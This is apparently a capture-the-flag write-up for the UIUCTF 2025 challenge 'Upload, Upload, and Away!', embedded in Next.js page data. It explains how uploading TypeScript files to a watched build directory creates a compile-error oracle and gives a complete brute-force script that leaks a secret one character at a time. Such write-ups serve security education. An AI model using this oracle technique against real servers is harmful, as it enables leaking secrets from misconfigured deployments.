1:"$Sreact.fragment"
2:I[10453,["/_next/static/chunks/b9afcb09c56609a6.js","/_next/static/chunks/59d5dd52dd9fcb16.js","/_next/static/chunks/0eb309e820c00a6d.js","/_next/static/chunks/a6b27ecf1b9e9188.js","/_next/static/chunks/39b99946d2be6a43.js"],"default"]
1e:I[97367,["/_next/static/chunks/ff1a16fafef87110.js","/_next/static/chunks/b71c1cfea9076b4b.js"],"OutletBoundary"]
1f:"$Sreact.suspense"
3:T6ad,import express from "express";
import path from "path";
import multer from "multer";
import fs from "fs";

const app = express();
const PORT = process.env.PORT || 3000;

let fileCount = 0;

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "../public/index.html")); // paths are relative to dist/
});

const imagesDir = path.join(__dirname, "../images");
if (!fs.existsSync(imagesDir)) {
  fs.mkdirSync(imagesDir, { recursive: true });
}

const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, imagesDir);
  },
  filename: function (req, file, cb) {
    cb(null, path.basename(file.originalname));
  },
});

const upload = multer({ storage });

app.get("/filecount", (req, res) => {
  res.json({ file_count: fileCount });
});

app.post("/upload", upload.single("file"), (req, res) => {
  if (!req.file) {
    return res.status(400).send("No file uploaded.");
  }
  fileCount++;
  res.send("File uploaded successfully.");
});

app.delete("/images", (req, res) => {
  const imagesDir = path.join(__dirname, "../images");
  fs.readdir(imagesDir, (err, files) => {
    if (err) {
      return res.status(500).send("Failed to read images directory.");
    }
    let deletePromises = files.map((file) =>
      fs.promises.unlink(path.join(imagesDir, file))
    );
    Promise.allSettled(deletePromises)
      .then(() => {
        fileCount = 0;
        res.send("All files deleted from images directory.");
      })
      .catch(() => res.status(500).send("Failed to delete some files."));
  });
});

app.listen(PORT, () => {
  return console.log(`Express is listening at http://localhost:${PORT}`);
});

export const flag = "uiuctf{fake_flag_xxxxxxxxxxxxxxxx}";0:{"buildId":"DfvEc75fs5QFxpmscM4-K","rsc":["$","$1","c",{"children":[["$","div",null,{"children":["$","main",null,{"className":"text-pretty max-w-5xl mx-auto text-sm [&_h1]:text-5xl [&_h1]:font-semibold [&_h1]:mb-8 [&_blockquote]:text-secondary [&_blockquote]:space-y-3 [&_blockquote]:border-l-4 [&_blockquote]:border-secondary [&_blockquote]:pl-5 [&_blockquote]:mb-5 [&>_p]:my-4 [&_img]:my-5 [&_ul]:list-disc [&_ul]:pl-6 [&_ol]:list-decimal [&_ol]:pl-6 [&_img]:rounded [&_li]:my-2","children":[["$","h1","h1-0",{"children":"UIUCTF 2025 â€” Upload, Upload, and Away!"}],"\n",["$","blockquote","blockquote-0",{"children":["\n",["$","p","p-0",{"children":"Keeping track of all these files makes me so dizzy I feel like I'm floating in space."}],"\n",["$","p","p-1",{"children":["Instancer url: ",["$","a","a-0",{"href":"https://upload-upload-and-away.chal.uiuc.tf/","children":"https://upload-upload-and-away.chal.uiuc.tf/"}]]}],"\n",["$","p","p-2",{"children":"Flag format: uiuctf{[a-z_]+}"}],"\n"]}],"\n",["$","p","p-0",{"children":"We're given a TypeScript server that looks like this:"}],"\n",["$","$L2","pre-0",{"className":"my-2","children":"$3","language":"js"}],"\n",["$","p","p-1",{"children":["The express app exposes a few routes that let us upload files to the ",["$","code","code-0",{"className":"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"../images"}]," directory on the server, as well as query the \"file count\" tracking the number of files that have been uploaded."]}],"\n",["$","p","p-2",{"children":["Curiously, looking in the project ",["$","code","code-0",{"className":"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"package.json"}],","]}],"\n",["$","$L2","pre-1",{"className":"my-2","children":"{\n  \"name\": \"tschal\",\n  \"version\": \"1.0.0\",\n  \"scripts\": {\n    \"start\": \"concurrently \\\"tsc -w\\\" \\\"nodemon dist/index.js\\\"\"\n  },\n  \"keywords\": [\n    \"i miss bun, if only there was an easier way to use typescript and nodejs :)\"\n  ],\n  \"author\": \"\",\n  \"license\": \"ISC\",\n  \"description\": \"\",\n  \"devDependencies\": {\n    \"@types/express\": \"^5.0.3\",\n    \"@types/multer\": \"^2.0.0\",\n    \"concurrently\": \"^9.2.0\",\n    \"nodemon\": \"^3.1.10\",\n    \"typescript\": \"^5.8.3\"\n  },\n  \"dependencies\": {\n    \"express\": \"^5.1.0\",\n    \"multer\": \"^2.0.2\"\n  }\n}","language":"json"}],"\n","$L4","\n","$L5","\n","$L6","\n","$L7","\n","$L8","\n","$L9","\n","$La","\n","$Lb","\n","$Lc","\n","$Ld","\n","$Le","\n","$Lf","\n","$L10","\n","$L11","\n","$L12","\n","$L13","\n","$L14","\n","$L15","\n","$L16","\n","$L17"]}]}],["$L18","$L19","$L1a","$L1b"],"$L1c"]}],"loading":null,"isPartial":false}
4:["$","p","p-3",{"children":["the server uses ",["$","a","a-0",{"href":"https://www.npmjs.com/package/concurrently","children":["$","code","code-0",{"className":"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"concurrently"}]}]," to run ",["$","code","code-0",{"className":"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"tsc -w"}]," and ",["$","code","code-1",{"className":"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"nodemon dist/index.js"}]," simultaneously. The key observation is this:"]}]
5:["$","ul","ul-0",{"children":["\n",["$","li","li-0",{"children":[["$","code","code-0",{"className":"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"tsc -w"}]," runs the TypeScript compiler in ",["$","a","a-0",{"href":"https://www.typescriptlang.org/docs/handbook/compiler-options.html","children":"watch mode"}],", telling it to automatically recompile the project when source files have changed."]}],"\n",["$","li","li-1",{"children":[["$","code","code-0",{"className":"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"nodemon"}]," will ",["$","a","a-0",{"href":"https://www.npmjs.com/package/nodemon","children":"restart the server"}]," when a ",["$","code","code-1",{"className":"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":".js"}]," file has changed."]}],"\n",["$","li","li-2",{"children":"Since the file count is just a local variable, when the server restarts it will be reset to 0."}],"\n"]}]
6:["$","p","p-4",{"children":["The above combine to give us a TypeScript error oracle: uploading TypeScript files to the server will trigger ",["$","code","code-0",{"className":"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"tsc"}]," to recompile the project. If the compilation succeeds, new ",["$","code","code-1",{"className":"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":".js"}]," files will be generated that will trigger ",["$","code","code-2",{"className":"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"nodemon"}]," to restart the server and reset the file count; otherwise, the file count will be incremented as normal. Querying the file count, therefore, lets us check whether arbitrary TypeScript code compiles on the server."]}]
7:["$","p","p-5",{"children":"Indeed, we can test with simple TS files that both fails to and succeed in compiling. Uploading a TypeScript file that fails to compile, we get"}]
8:["$","$L2","pre-2",{"className":"my-2","children":"import { flag }  from '../index';\n\nexport const x: number = flag;","language":"ts"}]
9:["$","$L2","pre-3",{"className":"my-2","children":"5:47:53 PM - File change detected. Starting incremental compilation...\n[0]\n[0] images/test.ts(3,14): error TS2322: Type 'string' is not assignable to type 'number'.\n[0]\n[0] 5:47:53 PM - Found 1 error. Watching for file changes.","language":"bash"}]
a:["$","p","p-6",{"children":"but using a file that successfully compiles, we instead get"}]
b:["$","$L2","pre-4",{"className":"my-2","children":"import { flag }  from '../index';\n\nexport const x: string = flag;","language":"ts"}]
c:["$","$L2","pre-5",{"className":"my-2","children":"5:44:58 PM - File change detected. Starting incremental compilation...\n[0]\n[0]\n[0] 5:44:59 PM - Found 0 errors. Watching for file changes.\n[1] [nodemon] restarting due to changes...\n[1] [nodemon] starting `node dist/index.js`\n[1] Express is listening at http://localhost:3000","language":"bash"}]
d:["$","p","p-7",{"children":"and our file count is reset to 0."}]
e:["$","p","p-8",{"children":["We can use this error oracle to leak the flag with a technique reminiscent of ",["$","a","a-0",{"href":"https://kevin.fish/writeups/a851fdabc90d887a61af81c071f6f0ce","children":"BuckeyeCTF 2023"}],": since the flag is exported from ",["$","code","code-0",{"className":"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"index.ts"}]," as a ",["$","code","code-1",{"className":"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"const"}]," variable, we can use ",["$","a","a-1",{"href":"https://www.typescriptlang.org/docs/handbook/2/template-literal-types.html","children":"template literal types"}]," to assert against substrings of the flag."]}]
f:["$","p","p-9",{"children":["Concretely, for those not familiar with this technique, if the flag exported by ",["$","code","code-0",{"className":"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"index.ts"}]," was"]}]
10:["$","$L2","pre-6",{"className":"my-2","children":"export const flag = 'uiuctf{test_flag}'  // flag: \"uiuctf{test_flag}\"","language":"ts"}]
11:["$","p","p-10",{"children":["then the first assignment would successfully type check, while the second fails (since the first character of the ",["$","code","code-0",{"className":"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"flag"}]," string is not ",["$","code","code-1",{"className":"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"a"}],"):"]}]
12:["$","$L2","pre-7",{"className":"my-2","children":"const foo: `u${string}` = flag;","language":"ts"}]
13:["$","$L2","pre-8",{"className":"my-2","children":"const foo: `a${string}` = flag;  // Type '\"uiuctf{test_flag}\"' is not assignable to type '`a${string}`'.","language":"ts"}]
14:["$","p","p-11",{"children":"Thus, we just need to use template literals to brute force the flag character by character, checking the file count each time to determine if the character was correct. Here's a simple script that does just that:"}]
1d:T5b2,const BASE_URL = 'https://inst-ff5e88fd8f55fd4e-upload-upload-and-away.chal.uiuc.tf/';

function sleep(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
}

async function getFileCount() {
    const { file_count } = await (await fetch(`${BASE_URL}/filecount`)).json();
    return file_count;
}

async function deleteImages() {
    await fetch(`${BASE_URL}/images`, {
        method: 'DELETE'
    });
}

async function uploadCode(code) {
    const data = new FormData();
    data.append('file', new Blob([code], { type: 'text/plain' }), 'test.ts');

    const res = await (await fetch(`${BASE_URL}/upload`, {
        method: 'POST',
        body: data
    })).text()

    // console.log(res);
}

const charset = 'abcdefghijklmnopqrstuvwxyz_}'
let flag = 'uiuctf{'

async function bruteOnce(char) {
    await deleteImages();
    await uploadCode(`import { flag } from '../index'; export const x: \`${flag}${char}\$\{string\}\` = flag;`);

    // Sleep so that the server has time to restart if the type check passes
    await sleep(1500);
    const count = await getFileCount();

    return count === 0;
}

;(async () => {
    while (true) {
        for (const char of charset) {
            console.log(char);
            const valid = await bruteOnce(char);

            if (!valid) continue;

            flag += char;
            console.log('flag:', flag);
            break;
        }

        if (flag.at(-1) === '}') break;
    }
})();15:["$","$L2","pre-9",{"className":"my-2","children":"$1d","language":"js"}]
16:["$","p","p-12",{"children":"Running the script for a few minutes, we get the flag."}]
17:["$","$L2","pre-10",{"className":"my-2","children":"uiuctf{turing_complete_azolwkamgj}"}]
18:["$","script","script-0",{"src":"/_next/static/chunks/59d5dd52dd9fcb16.js","async":true}]
19:["$","script","script-1",{"src":"/_next/static/chunks/0eb309e820c00a6d.js","async":true}]
1a:["$","script","script-2",{"src":"/_next/static/chunks/a6b27ecf1b9e9188.js","async":true}]
1b:["$","script","script-3",{"src":"/_next/static/chunks/39b99946d2be6a43.js","async":true}]
1c:["$","$L1e",null,{"children":["$","$1f",null,{"name":"Next.MetadataOutlet","children":"$@20"}]}]
20:null
